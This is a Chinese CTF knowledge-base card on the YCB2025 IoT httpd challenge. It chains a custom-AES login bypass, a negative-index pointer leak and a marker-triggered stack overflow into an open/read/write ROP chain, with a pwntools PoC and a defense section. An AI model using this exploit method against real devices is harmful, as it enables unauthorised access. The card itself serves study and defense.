---
id: binary-pwn-stack-iot-httpd-custom-aes-negative-index-marker-overflow-orw
title: IoT httpd 多阶段链：自定义 S-box AES 登录绕过 + 负索引泄露 + YCB2025 标记触发栈溢出 ORW
type: scenario
domain: binary
path: binary/pwn/stack
technique: iot-httpd-custom-aes-negative-index-marker-overflow-orw
tags:
- pwn
- iot
- httpd
- webpwn
- stack-overflow
- rop
- orw
- negative-index
- custom-aes
- auth-bypass
- libmicrohttpd
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V181
  verified_at: '2026-11-06T17:43:31+08:00'
  notes: 已对照原文核对：自定义 S-box AES 登录绕过、/log 负索引 index=-181 泄露 printf、/work 存 /flag 并泄露堆地址、YCB2025 标记决定 memcpy 长度覆盖 64 字节栈、open/read/write ORW 均与原文一致。未复跑，AES key/S-box、fd 6/5、gadget 偏移为示例环境值，需按目标重算。
url: /docs/binary/pwn/stack/binary-pwn-stack-iot-httpd-custom-aes-negative-index-marker-overflow-orw/
draft: false
kb_aliases:
- 羊城杯 hello_iot3
- YCB2025
- httpd libmicrohttpd
- 自定义 S 盒 AES
- 负索引泄露
- 标记触发栈溢出
- IoT pwn
---

## 一句话结论

IoT 固件 HTTP 服务以 root 运行、flag 在 `/flag`：先从 `/login.html` 取 16 字节随机明文，用二进制里的自定义 S-box AES-128（key 示例 `0123456789ABCDEF`）加密后 POST `/login` 绕过鉴权；再用 `/log` 的负索引越界读泄露 libc 与 `/work` 存储的 `/flag` 指针；最后在 `/work` 的请求体里放置 `0x4d` 填充 + ROP 链 + 字面量 `"YCB2025"`，让处理函数以标记位置为长度 `memcpy` 进 64 字节栈缓冲区，覆盖返回地址后执行 open/read/write 读出 flag。

## 原理

- **运行环境**：Dockerfile 把 `/bin/sh`、`/bin/ls`、`/bin/cat` 放进 `/home/ctf/bin`，`start.sh` 把 `$DASFLAG` 写入 `/flag`，supervisord 以 `user=root` 启动 `/home/ctf/httpd`；libc 为 2.31。程序崩溃后 supervisord 约 5 秒重启，静态资源在 `/home/ctf` 不变。
- **路由与鉴权**：`httpd` 用 libmicrohttpd 监听 9999，路由包括 `/login.html`（GET，生成 16 字节随机字符串并回显）、`/login`（POST `ciphertext`）、`/work`、`/log`。`/login` 把 `ciphertext` 做自定义 AES 解密，与 `/login.html` 生成的随机串比较；相等则置 `dword_406268 = 1`，后续接口才可用。
- **自定义 S-box AES**：解密函数使用 `.rodata`/`unk_406160` 处的 256 字节自定义 S-box，而不是标准 AES S-box；密钥扩展/轮函数仍按 AES-128 结构（10 轮、RCON、列混淆）。由于 `/login.html` 直接泄露明文，且 S-box/key 可从二进制提取，攻击者用同一套自定义 AES 加密该明文并 POST 即可得到合法 ciphertext——这不是破解密钥，而是利用“明文公开 + 算法公开”。
- **负索引泄露**：`/log` 把 `index` 经 `atoi` 转成 `int n99`，只检查 `n99 < 全局计数 && qword_4065C0[n99]`，没有检查 `n99 >= 0`。负数下标会读到 `qword_4065C0` 之前的全局/GOT 区域；当分支走 `"<pre>%p</pre>"` 格式化时，把该地址处的指针以十六进制返回。示例 `index=-181` 读到 libc 的 `printf` 指针，`index=0` 读到 `qword_4065C0[0]`（`/work` 存储块的堆地址）。
- **存储 `/flag` 字符串**：`/work` 把请求体（跳过前 5 字节）复制到 `malloc(n+1)`，指针存入 `qword_4065C0[n99++]`；先 POST 内容 `aaaaa/flag\0`，实际存储的是 `/flag`，再用 `/log index=0` 泄露该块的地址，作为 ROP 的 `open` 路径参数。
- **标记触发的栈溢出**：`/work` 在处理完请求后会在 body 中搜索字面量 `"YCB2025"`；找到后计算 `dest_3 - dest`（标记偏移）并调用 `sub_4031A2(dest, n)`：
  ```c
  __int64 sub_4031A2(const void *dest, int n) {
      _BYTE desta[64];
      memcpy(desta, dest, n);
      return 0;
  }
  ```
  `n` 完全由标记位置决定，没有与 64 比较。把 `"YCB2025"` 放在 `0x4d` 填充 + ROP 链之后，`n` 大于 64，`memcpy` 覆盖 `desta` 的 saved RIP；标记本身是复制的终点，不会进入栈帧。
- **ROP ORW**：用泄露的 libc 基址取 `pop rax/rdi/rsi/rdx` 与 `syscall;ret`；`open("/flag",0)`（示例返回 fd 6）→ `read(6, bss, 0x30)` → `write(5, bss, 0x30)`，把 flag 写回目标进程的 stdout/连接（示例 fd 5）。fd 编号由目标服务的 fd 布局决定，需按环境调整。
- **完整顺序**：GET 登录页拿明文 → 自定义 AES 加密 POST 登录 → 负索引泄露 libc → `/work` 存 `/flag` 并泄露其地址 → 带标记的 `/work` 触发栈溢出 → ROP ORW。

## 触发条件

- 目标为 IoT/CTF httpd（示例 libmicrohttpd），以 root 运行，flag 位于 `/flag`，libc 2.31；二进制非 PIE 或 gadget 地址固定，栈溢出能覆盖 saved RIP（无 canary 或可绕过）。
- `/login.html` 回显 16 字节明文；`/login` 使用自定义 S-box AES 且密钥/算法可从二进制提取；可重复 POST 登录。
- `/log` 的 index 解析为有符号整数且缺少下界检查，能通过负索引读出 GOT/全局指针；`/work` 能存储任意数据并返回其指针。
- `/work` 的标记字符串（示例 `YCB2025`）已知，标记位置可控制 `memcpy` 长度；程序崩溃后会被守护进程重启，允许重试。

## 利用步骤

1. 读 Dockerfile/start.sh/supervisord，确认 root、`/flag`、libc 2.31、静态资源目录与重启行为。
2. GET `/login.html` 提取 16 字节明文；从二进制提取自定义 S-box 与 key（示例 `0123456789ABCDEF`），按 AES-128 结构实现加密，POST `/login` 的 `ciphertext`，确认鉴权通过。
3. POST `/log`，`index=-181`，解析响应中的 `0x...` 指针；减去 libc `printf` 偏移得到 libc 基址（示例偏移 0x36174 等需按 libc 版本核对）。
4. POST `/work`，body 为 `aaaaa/flag\x00`（前 5 字节被处理函数跳过，实际存储 `/flag`）；再 POST `/log index=0` 泄露该块的堆地址 `flag_addr`。
5. 用 libc gadget 构造 ROP：`open(flag_addr, 0)` → `read(fd, store_addr, 0x30)` → `write(out_fd, store_addr, 0x30)`；`store_addr` 选可写 BSS（示例 `0x4065A0`）。
6. POST `/work`，body 为 `b"a"*0x4d + rop + b"YCB2025"`；处理函数以标记偏移为长度 `memcpy` 到 64 字节栈缓冲区，覆盖返回地址，返回时进入 ROP。
7. 从响应/日志读取 flag；若进程崩溃，等待 supervisord 重启（约 5 秒）后可重试。

## PoC

HTTP 链与 ROP 骨架（地址/偏移取自文章示例，必须按目标重算）：

```python
import re, http.client, urllib.parse
from pwn import *

libc = ELF("./libc-2.31.so")
host, port = "target", 9999

def req(method, path, data=None):
    conn = http.client.HTTPConnection(host, port)
    headers = {"Content-type": "application/x-www-form-urlencoded"}
    conn.request(method, path, data, headers)
    r = conn.getresponse().read().decode()
    conn.close()
    return r

# 1) 登录：ciphertext = 自定义 S-box AES 加密(login.html 的 16 字节明文)
plain = extract_16_bytes(req("GET", "/login.html"))       # 解析登录页随机串
ct = custom_sbox_aes_encrypt(plain, key=b"0123456789ABCDEF")
print(req("POST", "/login", urllib.parse.urlencode({"ciphertext": ct.hex()})))

# 2) 负索引泄露 libc（示例 index=-181 -> printf）
resp = req("POST", "/log", urllib.parse.urlencode({"index": "-181"}))
printf_addr = int(re.search(r"0x[0-9a-fA-F]+", resp).group(), 16)
lib = printf_addr - libc.sym["printf"]
print("libc:", hex(lib))

# 3) 存储 /flag 并泄露其地址
req("POST", "/work", "aaaaa/flag\x00")
resp = req("POST", "/log", urllib.parse.urlencode({"index": "0"}))
flag_addr = int(re.search(r"0x[0-9a-fA-F]+", resp).group(), 16)
print("flag_addr:", hex(flag_addr))

# 4) ROP: open/read/write
pop_rdi = 0x403633
pop_rsi = 0x403631
pop_rax = lib + 0x36174
pop_rdx = lib + 0x119431
syscall = next(libc.search(asm("syscall;ret")))
store   = 0x4065A0

pay  = flat(pop_rax, 2, pop_rdi, flag_addr, pop_rsi, 0, 0, pop_rdx, 0x30, 0, syscall)  # open
pay += flat(pop_rax, 0, pop_rdi, 6, pop_rsi, store, 0, pop_rdx, 0x30, 0, syscall)     # read fd 6
pay += flat(pop_rax, 1, pop_rdi, 5, pop_rsi, store, 0, pop_rdx, 0x30, 0, syscall)     # write fd 5

payload = b"a" * 0x4d + pay + b"YCB2025"
print(req("POST", "/work", urllib.parse.urlencode({"data": payload.decode("latin1")})))
```

文章使用固定 ciphertext `54813b...`（对应某个登录页明文），换目标后必须重新计算；`index=-181`、fd 6/5、`pop_rax=lib+0x36174`、`pop_rdx=lib+0x119431`、`store=0x4065A0` 等都是示例环境值。自定义 AES 的 S-box 表在 `unk_406160`，按标准 AES-128 轮函数替换 S-box 即可复现加密。

## 变体与关联

- **同类 webpwn 链**：[[ctf-pwn-webpwn-proxy-rsa-auth-bypass-backend-oob-rop]] 是 proxy RSA 配置溢出 + 后端负索引 + `memcpy_w` 栈溢出 ORW；本卡的鉴权绕过（自定义 S-box AES）与溢出触发（`YCB2025` 标记长度）不同，可对照其“鉴权→泄露→栈溢出→ORW”框架。
- **负索引泄露**：[[ctf-pwn-negative-index-hidden-slot-encoded-fptr]] 等卡讲负数下标读隐藏槽位；本卡用负索引读 GOT/全局指针泄露 libc/堆。
- **自定义 S-box AES**：[[ctf-reverse-custom-aes-sbox-shiftrows-c2-traffic-decrypt]] 讲自定义 S-box/ShiftRows 的逆向；本卡是登录校验的“明文公开→同算法加密”绕过。
- **IoT 栈溢出**：[[binary-pwn-stack-mips-hedwig-cgi-uid-rop]]、[[binary-pwn-stack-dir505-my-cgi-content-length-overflow-mipseb-rop]] 是真实 IoT CGI 的栈溢出；本卡是 x86-64 本地/CTF 服务。
- 边界：若登录页明文每次变化，必须实时加密；若 `/work` 标记被过滤或长度受限，需要换触发方式；若开启 canary/PIE，需先泄露/绕过。

## 检测与防御

- 鉴权：不要用自定义 S-box AES 作为登录保护；使用标准密码学、随机挑战、常量时间比较，且不要把明文回显在页面上。
- 数组索引：对 `index` 同时检查 `n99 >= 0 && n99 < count`；不要把用户可控数据指针存入全局数组后按索引直接格式化。
- 内存安全：`memcpy` 前校验目标缓冲区大小；不要用“标记字符串位置”作为拷贝长度；编译开启 PIE/Canary/NX/RELRO，服务降权运行。
- 检测：负索引请求、包含 `YCB2025` 等标记的超长 `/work` 请求、httpd 异常崩溃/重启、由 httpd 发起的 open/read/write 系统调用与 `/flag` 访问；日志中出现 `/login` 高频尝试与异常 ciphertext。
- 真实 IoT：最小权限运行、关闭调试/管理接口、固件签名与完整性校验；flag/密钥不要放在服务进程可读的固定路径。
